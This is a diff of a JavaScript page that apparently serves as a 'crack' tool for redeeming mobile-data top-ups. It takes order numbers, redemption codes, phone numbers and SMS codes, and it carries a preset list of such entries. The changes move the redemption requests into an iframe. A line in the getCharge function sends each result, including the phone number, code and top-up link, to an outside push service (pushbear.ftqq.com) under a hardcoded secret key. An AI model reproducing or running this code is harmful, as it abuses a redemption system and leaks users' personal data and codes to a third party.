@@ -670,7 +670,7 @@ var preset = [
 var used = [];
 
 var showIn = function(){
-  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><input type=text class=form-control id=rand placeholder=短信验证码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-09-09-13 20:40)' style='height:200px'></textarea>");
+  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><input type=text class=form-control id=rand placeholder=短信验证码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px;font-size: 11px;'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-09-09-13 17:40)' style='height:200px'></textarea><iframe src='' style='position: fixed; border: 1px solid black; top: 0px; right: 0px;background-color: yellow;'>");
   $("#yql").attr("onclick", "getEnc()");
   localStorage.preset = removeUsed(preset).join("\r\n");
   $("#preset").val(localStorage.preset);
@@ -747,8 +747,8 @@ var getEnc = function(retry){
  //              $("#yql").removeAttr("disabled");
  //          }
  //      });
-		$("body").append("<iframe src='"+u+"' style='position: fixed; border: 1px solid black; top: 0px; right: 0px;'>");
-		$("#yql").text("如果下方文字中包含yes表示验证码发送成功");
+		$("#frame").src = u;
+		$("#yql").text("如果黄色框文字中包含true表示验证码发送成功");
     }else{
       alert("缺少数据");
       $("#yql").removeAttr("disabled"); 
@@ -798,11 +798,12 @@ var getCharge = function(){
 		var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 充值链接: " + u;
 		var extra = " 2款" + orderId;
 		if(myList.indexOf(orderId) > -1){
-		extra = " 14款" + orderId;
+			extra = " 14款" + orderId;
 		}
+		$("#frame").src = u;
 		$.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=流量充值"+extra+"&desp=" + result)
 		$("#result").val(result);
-		$("#yql").text("复制充值链接到手机微信或者电脑微信并打开");
+		$("#yql").text("请看黄色框中充值结果");
 		$("#mobile").val("");
 		$("#code").val("");
 		$("#orderId").val("");
